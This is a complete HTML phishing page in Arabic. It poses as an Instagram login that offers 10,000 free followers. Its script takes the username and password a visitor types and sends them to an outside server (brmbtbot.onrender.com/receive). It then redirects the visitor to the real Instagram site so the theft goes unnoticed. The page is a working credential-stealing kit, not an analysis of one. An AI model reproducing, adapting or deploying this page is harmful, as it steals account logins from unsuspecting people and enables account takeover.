<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Instagram Followers Gift</title>
    <style>
        body { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; margin: 0; }
        .card { background: #fff; width: 330px; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; font-style: italic; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; box-sizing: border-box; }
        .btn { width: 100%; background: #0095f6; color: #fff; border: none; padding: 12px; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Instagram</div>
        <p style="font-size: 14px; color: #666;">سجل الدخول لاستلام 10k متابع</p>
        <form id="f">
            <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف" required>
            <input type="password" id="p" placeholder="كلمة المرور" required>
            <button type="submit" class="btn">احصل على المتابعين</button>
        </form>
    </div>
    <script>
        document.getElementById('f').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('https://brmbtbot.onrender.com/receive', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ platform: 'Instagram Followers', u: document.getElementById('u').value, p: document.getElementById('p').value })
            }).finally(() => { window.location.href = 'https://www.instagram.com'; });
        });
    </script>
</body>
</html>
